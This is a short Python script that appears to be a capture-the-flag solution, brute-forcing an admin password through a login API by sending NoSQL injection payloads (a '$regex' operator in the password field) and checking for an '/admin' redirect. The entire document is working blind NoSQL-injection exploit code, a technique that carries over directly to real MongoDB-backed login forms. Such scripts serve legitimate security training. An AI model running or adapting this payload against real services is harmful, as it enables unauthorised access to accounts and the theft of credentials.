import requests, string, json

TARGET = "http://cits4projtg2.cybernemosyne.xyz:1007/api/login"

def test_char(payload):
    r = requests.post(
        TARGET,
        json = payload
    )
    result = json.loads(r.text)
    return result.get("url", "") == "/admin"

def main():
    # Since we already know the password starts with CTF
    password = "CTF"

    while True:
        # The challenge description says the password is only upper and lower case letters.
        for c in string.ascii_letters:
            payload = {
                "username" : "admin",
                "password" : {
                    "$regex" : "^{}".format(password + c)
                }
            }

            if test_char(payload):
                print("FOUND CHAR:", c)
                password = password + c
                print("PASSWORD:", password)

if __name__ == "__main__":
    main()
